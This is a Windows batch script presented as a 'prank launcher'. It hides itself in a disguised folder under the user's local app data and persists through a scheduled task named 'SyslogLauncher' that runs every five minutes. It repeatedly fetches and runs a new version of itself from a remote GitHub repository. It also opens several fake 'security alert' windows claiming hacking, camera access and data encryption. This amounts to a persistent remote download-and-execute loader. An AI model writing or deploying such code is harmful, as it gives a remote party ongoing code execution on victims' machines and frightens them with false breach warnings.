@echo off
setlocal enabledelayedexpansion

:: ============================================================
::   AUTO‑UPDATING PRANK LAUNCHER (single file, no Python)
::   Stores files in %LOCALAPPDATA%\.sysupdatecom (hidden)
:: ============================================================

:: ---------- CONFIGURATION ----------
set "BASE=%LOCALAPPDATA%\.sysupdatecom"
set "SELF=%BASE%\launcher.cmd"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "SELF_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/launcher.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "REMOTE_VER=%TEMP%\rv.txt"
set "MAX_RETRIES=3"
:: ===================================

:: Create base folder (if not exist) and hide it
if not exist "%BASE%" mkdir "%BASE%"
attrib +h "%BASE%" >nul 2>&1

:: Self‑install (copy ourselves to BASE)
if /i not "%~f0"=="%SELF%" (
    copy /Y "%~f0" "%SELF%" >nul
    attrib +h "%SELF%" >nul 2>&1
)

:: ---------- FUNCTION: DOWNLOAD WITH RETRIES ----------
:DOWNLOAD
set "URL=%~1"
set "OUT=%~2"
set "RETRY_COUNT=0"

:RETRY_LOOP
set /a RETRY_COUNT+=1
if !RETRY_COUNT! gtr %MAX_RETRIES% (
    exit /b 1
)

:: Method 1: PowerShell
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!OUT!' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
if exist "!OUT!" (
    for %%A in ("!OUT!") do if %%~zA gtr 0 exit /b 0
)

:: Method 2: curl (if available)
where curl >nul 2>&1
if !errorlevel! equ 0 (
    curl -s -L -o "!OUT!" "!URL!" >nul 2>&1
    if exist "!OUT!" (
        for %%A in ("!OUT!") do if %%~zA gtr 0 exit /b 0
    )
)

:: Wait a bit and retry
timeout /t 2 /nobreak >nul
goto RETRY_LOOP
:: ------------------------------------------------

:: ---------- CHECK FOR UPDATES ----------
call :DOWNLOAD "%VERSION_URL%" "%REMOTE_VER%"
if exist "%REMOTE_VER%" (
    set /p REMOTE=<"%REMOTE_VER%"
    if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"
    if not "!LOCAL!"=="!REMOTE!" (
        echo Updating from !LOCAL! to !REMOTE! ...
        call :DOWNLOAD "%SELF_URL%" "%TEMP%\update.cmd"
        if exist "%TEMP%\update.cmd" (
            :: Rename current script (still running) to .old
            move /Y "%SELF%" "%SELF%.old" >nul
            :: Move new version into place
            move /Y "%TEMP%\update.cmd" "%SELF%" >nul
            :: Update version file
            echo !REMOTE! > "%LOCAL_VER%"
            :: Hide the new file
            attrib +h "%SELF%" >nul 2>&1
            :: Launch the new version
            start "" "%SELF%"
            exit
        ) else (
            echo Failed to download update.
        )
    )
)

:: ---------- PRANK CODE (embedded) ----------
title SYSTEM BREACH DETECTED
color 0a
for /l %%i in (1,1,5) do (
    start "SECURITY ALERT %%i" cmd /c "color 4 && title CRITICAL ERROR %%i && echo. && echo [!] Unauthorized Access Detected... && echo. && echo Hacking Laptop... %%i%% && echo. && echo Accessing Camera... && echo Accessing Files... && echo Encrypting Data... && echo. && echo DO NOT TURN OFF YOUR COMPUTER! && echo. && echo Press any key to attempt recovery... && pause > nul"
)
timeout /t 2 > nul
:: ==========================================

:: ---------- SCHEDULE TASK (every 5 min, runs at startup) ----------
schtasks /create /tn "SyslogLauncher" /tr "cmd /c start /min \"\" \"%SELF%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal